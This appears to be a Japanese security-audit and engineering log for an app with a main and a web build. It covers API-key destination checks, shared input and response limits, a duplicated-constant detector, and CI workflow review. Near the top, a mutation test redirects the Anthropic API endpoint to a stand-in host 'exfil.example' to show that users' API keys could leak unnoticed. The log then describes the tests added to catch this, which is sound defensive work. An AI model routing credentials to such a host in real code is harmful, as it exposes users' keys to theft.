| `business/advise` | **留めてあった** (`webShimCredentials.test.ts` に専用の検査) |
| `stocks/advise` | **無し** |
| `emotions/analyze-text` | **無し** |

後ろ 2 つの URL を `https://exfil.example/v1/messages` へ書き換えて全部回すと:

```
  Tests  10778 passed (10778)     ← 両方とも、全部緑のまま
```

**利用者の Anthropic API キーが、そのまま知らないホストへ出る変更である。**

#### なぜ既存の網に掛からなかったか

`lint:network-targets` は**送り先が変数で決まる通信**の台帳である。
ここはリテラルなので対象外 —— そしてリテラルを見る検査は
`business/advise` の 1 本だけだった。既存の検査の注記自身が
「**URL が変われば鍵がそのまま別のホストへ行く。字面で留める。**」と
書いていたのに、**兄弟 2 つに当てていなかった。**

**掃討はファイル単位、危険は関数単位** —— 同じファイルの中で起きた。

#### 足した検査

1. `stocks/advise` と `emotions/analyze-text` も
   **送り先がちょうど `https://api.anthropic.com/v1/messages` の 1 本**であること。
   ついでに鍵が他のヘッダにも本文にも混ざらないこと (既存の 1 本と同じ形)。
2. **集合も留める** —— `timedFetchAi(` の**字面の送り先が 1 種類だけ**であること。
   名指しの規則は名指しした綴りしか止められないので、**4 本目**に対しては
   1 が何も言わない。

#### 対照

| 壊し方 | 結果 |
|---|---|
| `emotions` の送り先を書き換え | **2 件落ちる** (経路の検査 + 集合の検査) |
| `stocks` の送り先を書き換え | **2 件落ちる** |
| `business` の送り先を書き換え | **2 件落ちる** |
| **4 本目**の `timedFetchAi` を足す | **1 件落ちる** (`送り先が増えました。…it.each にも足してください`) |

いずれも直す前は **10,778 件が全部緑**だった経路である。

#### 自分の誤り

最初 `emotions` の action 名を `analyze` と書いて「送り先が変わっています」と
落ちた —— **実際は 1 度も fetch されていなかった** (正しくは `analyze-text`)。
`toEqual([])` 側のメッセージだけ読んで「経路が壊れた」と誤読しかけた。
**0 件と『違うホスト』は別の失敗である。**

#### 続き —— 鍵が出る残りの経路も全部当てた (同日・全部白)

前節で shim の 2 経路を留めたので、**鍵が出る他の口も同じやり方で当てた。**
どれも既に留まっていた (対照を回して確認):

| 経路 | 壊し方 | 落ちた検査 |
|---|---|---|
| `compat` (任意ホスト) を `browserDirect: true` へ | 直接叩けるようになる = 任意ホストへ鍵が出る | **3 件** |
| `openai` を `browserDirect: true` へ | 同上 | **3 件** |
| `anthropic` の送り先を書き換え | 直結先が変わる | **8 件** |
| `gemini` の送り先を書き換え | 同上 | **4 件** |
| `ollama` の送り先を書き換え | ループバック限定が崩れる | **6 件** |
| GitHub issue (PAT) の送り先を書き換え | PAT が別ホストへ | **2 件** |

**設計の筋が通っている** —— `browserDirect: true` なのは
「公式に CORS 対応の固定エンドポイント」(anthropic / gemini) と
「ループバック限定」(ollama) だけで、**任意ホストを取りうる `compat` は
`false`** (= プロキシ経由を強制)。その 2 つの性質がどちらも留まっている。

つまり穴だったのは、**`providers.ts` の層ではなく `web-shim.ts` の
ハードコードされた 2 経路だけ**だった。層ごとに当て直して初めて分かる。

### 自分の検出器は当てていた。選り分けたほうが間違っていた (2026-08-25)

**訂正。** 同日の「自動では見つけられないを、実際に検出器を書いて確かめた」
節で、両側に現れる数値リテラルを数えて **「新しい組は 0 件」** と書いた。
**間違いだった。**

検出器の出力にはこう出ていた:

```
  1000  shared にも在り  main=['main/clients/business.ts', …]
                          web=['renderer/web-shim.ts', …]
```

私はこれを **「たまたま同じ丸い数」** として捨てた。実際には
**同じ判断が 4 か所に字面で書かれていた**:

```
  main/clients/business.ts    question.length > 1000
  main/clients/stocks.ts      question.length > 1000
  renderer/web-shim.ts        question.length > 1000   (business)
  renderer/web-shim.ts        question.length > 1000   (stocks)
```

`1000` が他の 5 ファイルにも出ていたので**その組も coincidence だと決めつけた**
—— 1 つの数字が広く使われていることは、**特定の 2 か所が同じ決定である**ことを
否定しない。**検出器は当てていて、選り分けたほうが間違っていた。**

#### 何が危ないか

`business/advise` と `stocks/advise` は質問を**有料 API の本文へそのまま載せる**。
`main` は IPC の**信頼境界**なので、そちらだけ緩めば
**乗っ取られたレンダラーが利用者の鍵で長い本文を送れる**。
ブラウザ側だけ緩めば、同じことが利用者自身の操作で起きる (費用)。

このリポジトリは同じ形を既に 3 度まとめている
(`assistantLimits.ts` / `emotionsLimits.ts` / `recordEntryLimits.ts`)。
**ここだけ残っていた。**

#### 直し方

`shared/advisorQuestionLimits.ts` に `checkAdvisorQuestion()` を 1 つ置き、
4 か所すべてがそれを呼ぶ。**理由 (`empty` / `too-long` / `control-chars`) を
返す形**にして、呼び出し側がそれぞれの流儀 (`throw` / `err()`) で伝える ——
文言を共有すると、片方の言語や口調に引きずられる。

#### 対照

| 壊し方 | 結果 |
|---|---|
| `business` を字面の `> 1000` へ書き戻す | **1 件落ちる** (「字面で書かれていない」) |
| 共有側の上限を 1000 から 100000 に変える | **3 件落ちる** (両ビルドの振る舞いが同時に動く) |

**「無いことの検査」には標本を添えた** —— `not.toMatch` が
元の書き方 (`if (question.length > 1000) {`) に**実際に当たる**ことを、
同じ検査の中で確かめている (綴りが 1 つ違えば黙る検査にしないため)。

#### 作業中の自分の事故

検査に **NUL を生のまま**書いてしまい、ファイルが binary 扱いになった
(`grep` が "binary file matches" と言って気付いた)。符号位置のエスケープへ
直した。**制御文字は、書くときも符号位置で書く。**

#### 選り分け直したら、同じ組がもう 2 つ出てきた

前節の訂正を踏まえて検出器の出力を**もう一度**見た。`business.ts` /
`web-shim.ts` という**同じ組**に、`600` と `240` も並んでいた ——
そして今度は当たりだった。

`business/advise` の**応答**は第三者 (LLM) が返す値で、画面へ出す手前に
6 つの上限がある。それが**両ビルドに字面で二重に**書かれていた:

```
                       main/clients/business.ts   renderer/web-shim.ts
  recommendations            1..5                       1..5
  rationale                  1..600                     1..600
  actionItems                1..5                       1..5
  actionItems[]              1..240                     1..240
  riskFactors                1..3                       1..3
  riskFactors[]              1..240                     1..240
```

片方だけ緩めば、そのビルドだけが**より大きな第三者由来の値**を通す。

**検証器はまとめない。** 2 つは同じ上限を見ているが、**他に見ているものが
違う** (main は `allowedIds.has(...)` で事業 id の許可も確かめる)。
まとめると「どちらかの流儀へ寄せる」変更になり、そこで挙動が動く。
**ずれていたのは数字だけ**なので、`shared/advisorResponseLimits.ts` に
数字だけを置いた —— 先行例 (`assistantLimits.ts` / `recordEntryLimits.ts`)
も定数のみである。

対照: shim を字面へ書き戻すと **1 件**、共有の上限を動かすと **3 件**落ちる。
「無いことの検査」には**元の書き方の標本**を添えてある。

**教訓の形が変わった** —— 「検出器は誤検知が多い」ではなく、
**「誤検知の中に当たりが混ざる。混ざり方は、同じファイルの組で見ると分かる」**。
`1000` / `600` / `240` はどれも**`business.ts` と `web-shim.ts` の組**で出ていた。
数字ではなく**組**を見ていれば、3 つとも一度に拾えた。

### 検出器の使い方が決まった —— 数字ではなく「ファイルの組」で見る (2026-08-25)

2 度の訂正を経て、集計の軸を変えた。**数字ごと**ではなく
**(main 側ファイル, renderer 側ファイル) の組ごと**に共有定数を数えると、
当たりが上位に固まった:

```
  ★ 7個  main/clients/stocks.ts   ↔ renderer/data/stocksAnalysisWeb.ts
  ★ 5個  main/clients/emotions.ts ↔ renderer/data/emotionsWeb.ts
  ★ 3個  main/clients/stocks.ts   ↔ renderer/data/stocksWatchlistWeb.ts
   …
```

`1000` / `600` / `240` はどれも `business.ts` ↔ `web-shim.ts` の組だった。
**組で見ていれば 3 つとも一度に拾えた。**

#### 当たりは 3 つの類に分かれる

| 類 | 例 | 既存の網 |
|---|---|---|
| **1. 同名の export** | `isSafeSymbol` (`16` を共有) | **既に覆われている** —— 台帳に `decision` として載り、`dualBuildParity.test.ts` が**両実装を突き合わせている** |
| **2. モジュール直下の `const` / 埋め込みの `if`** | `MAX_MOODS` / `MAX_ANALYSES`、アドバイザーの上限 | **覆われていない** —— 検出器は **export された関数名**の積集合を見るので、`const` も `if` の中の数字も見えない |
| 3. 偶然 | `10` / `30` / `60` が別用途で一致 | — |

**検出器の値打ちは類 2 にある。** 既存の機械は類 1 を確実に捕まえるので、
重ねる意味は無い。**見えない所だけを見ればよい。**

#### 類 2 として今日直したもの

| 対象 | 直し方 |
|---|---|
| アドバイザーの質問 (`1000` × 4 か所) | `shared/advisorQuestionLimits.ts` |
| アドバイザーの応答 (`600` / `240` ほか 6 つ × 2 か所) | `shared/advisorResponseLimits.ts` |
| **気分ログの保持件数** (`MAX_MOODS = 365` / `MAX_ANALYSES = 50` × 2 か所) | `shared/emotionsLimits.ts` へ追加 |

最後のものは、**note/text の上限を同じファイルへ寄せたときに取り残されていた**
—— 同じ組の中でも、`export function` は寄せて `const` は残す、という
中途半端さが起きる。

対照: web 側で `const MAX_MOODS = 365;` を自前宣言に戻すと **1 件**、
共有の値を動かすと **4 件**落ちる。

#### 残した類 1・3

- `stocks.ts ↔ stocksAnalysisWeb.ts` の 7 個は `sma`/`ema`/`rsi`/`macd` の
  指標定数。これらの関数は台帳に **`pure`** として載っており、
  「ずれれば数字が違うだけで、境界の守りではない」と**明示的に**判断済み。
  蒸し返さない。
- `stocks.ts ↔ StoragePage.tsx` などの `10` / `30` / `60` は別用途の一致。

### CI の workflow と、サブプロセスの口 —— 2 面とも白 (2026-08-25 実測)

#### workflow のデータの流れ

| 見たもの | 結果 |
|---|---|
| `download-artifact` | **1 件も無い** —— 成果物が後段の実行へ流れ込む経路が存在しない |
| `upload-artifact` (2 件) | `knowledge-queue.json` と `mutation.json`。どちらも**既に公開されているリポジトリの内容から導かれる** ので新たな露出は無い |
| `actions/cache` (1 件) | Stryker の incremental のみ。`key: stryker-${{ github.ref_name }}` は `with:` なのでシェルへ渡らず、`lint:workflow-security` の self-test にも同じ形が標本として入っている |

`mutation.yml` は差分測定の前に **`rm -f .stryker-incremental.json`** を実行して
いる —— 2 節前に手で導いた手順と同じで、CI のほうが先に正しくやっていた。

#### サブプロセスの口 (不変条件 #9)

規則は「呼び方を数えず、**モジュールへの到達**を塞ぐ」形になっている。
`scripts/` は build/dev の道具として許し、**`src/` は許さない**。

対照を両方向で回した:

```
  src/main/clients/emotions.ts   に import 形   → 捕まる
  src/renderer/data/emotionsWeb.ts に require 形 → 捕まる
```

`scripts/` 側の 9 ファイルは**全部が台帳に載っている**
(`check-import-boundaries` / `knowledge-autopilot` / `lint-repo-size` /
`lint-shell` / `mcp-check` / `mutate-changed` / `progress` /
`quality-report` / `session-context`)。

#### 自分の危うかった読み

最初 `grep … | head -5` の出力だけを見て
**「`progress.cjs` が台帳に無い」と報告しかけた**。実際は台帳に載っており、
`head` が切っていただけである。このリポジトリの記録には
**同じ事故 (`head -4` で切った出力を見て誤読した) が既に 1 件ある**。

**切った出力で「無い」と言わない。** 「有る」は切った出力でも言えるが、
**「無い」は全体を見ないと言えない。**
